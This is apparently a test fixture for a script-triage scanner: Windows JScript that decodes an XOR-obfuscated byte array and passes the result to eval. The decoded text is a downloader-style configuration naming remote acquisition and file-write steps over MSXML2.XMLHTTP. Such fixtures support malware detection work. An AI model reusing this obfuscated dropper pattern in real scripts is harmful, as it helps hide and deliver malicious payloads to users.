// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_5abc9fd6 = function decode_5abc9fd6_body(s) {
  var d = [];
  var previous = 21;
  for (var i = 0; i < s.length; i++) { d.push(s[i] ^ previous); previous = s[i]; }
  return d;
};
var recover_51138936 = function recover_51138936_body() {
  // configuration reconstruction
  var characters = [110,76,63,75,46,94,45,15,53,110,76,45,78,63,74,35,81,52,107,25,124,17,126,10,111,77,97,67,52,70,47,91,62,97,7,110,2,103,69,24,52,22,119,19,114,2,118,19,97,67,121,91,22,69,29,80,28,46,0,88,21,89,17,69,17,65,111,89,119,71,101,73,107,29,124,16,101,0,115,81,107,16,50,81,48,93,45,76,37,66,44,115,26,126,92,102,68,39,70,43,91,58,83,52,90,119,18,115,23,117,71,38,68,117,71,113,83,127,93,40,90,54,20,46,12,100,16,100,20,103,93,114,93,56,89,61,95,109,12,110,95,109,91,117,16,104,9,100,20,120,29,51,90,52,66,35,79,38,66,109,89,106,12,53,80,96,3,58,20,112,17,101,71,107,73,60,79,42,88,7,102,1,100,10,126,92,102,68,12,121,23,99,17,116,7,116,56,89,59,20,113,16,116,22,36,69,39,22,36,18,48,28,62,88,49,93,56,103,23,118,2,106,72,114,80,19,41,117,41,124,15,106,24,107,55,107,59,78,44,64,41,74,22,74,2,119,25,109,31,122,9,122,54,87,53,105,53,70,50,83,52,81,124,25,120,28,126,76,45,79,126,76,122,84,48,81,37,7,122,86,116,7,115,18,117,16,83,60,73,39,83,113,75,121,4];
  var s = [];
  for (var ci = 0; ci < characters.length; ci++) { s.push(characters[ci]); }
  var n = (2 > 1) ? "left" : "right";
  var d = decode_5abc9fd6(s);
  var textParts;
  textParts = [];
  for (var bi = 0; bi < d.length; bi++) { textParts.push(String.fromCharCode(d[bi])); }
  var t = textParts.join("");
  return t;
  // end reconstruction
};
var inspect_922b5007 = function inspect_922b5007_body() {
  var o = eval("(" + recover_51138936() + ")");
  var p = new Object();
  p.steps = o.steps;
  p["adapter"] = o["adapter"];
  p.values = o.values;
  p["stageCount"] = o["stageCount"];
  return p;
};
